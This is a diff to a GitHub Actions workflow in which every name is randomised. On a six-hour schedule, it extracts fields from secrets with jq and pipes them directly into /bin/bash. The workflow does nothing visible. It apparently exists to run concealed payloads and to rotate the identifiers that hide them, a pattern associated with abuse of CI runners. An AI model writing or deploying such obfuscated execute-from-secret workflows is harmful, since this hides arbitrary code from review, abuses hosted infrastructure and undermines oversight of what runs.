@@ -2,21 +2,20 @@ name: misshgaukll
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 5/6 * * *'
-jobs:  # 1616
+    - cron: '21 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: misshgaukll
         env:
-          uwrkk9: ${{ secrets.uwrkk9 }}
+          yyoqy40067: ${{ secrets.yyoqy40067 }}
         run: |
-          echo $uwrkk9 | jq -r .vrdma59 | /bin/bash
-          echo $ddc9444 | jq -r .vcey9 | /bin/bash
-          echo $fa9513 | jq -r .ouaq68 | /bin/bash
-          echo $ziv598 | jq -r .jxpq2130 | /bin/bash
-          echo $y4540 | jq -r .iozsi33 | /bin/bash
-          echo $qeii199 | jq -r .v25 | /bin/bash
+          echo $yyoqy40067 | jq -r .lizm5 | /bin/bash
+          echo $eh15 | jq -r .x906 | /bin/bash
+          echo $n9 | jq -r .j85 | /bin/bash
+          echo $spgm71 | jq -r .aidgm0731 | /bin/bash
+          echo $hyg68 | jq -r .vi153 | /bin/bash
 
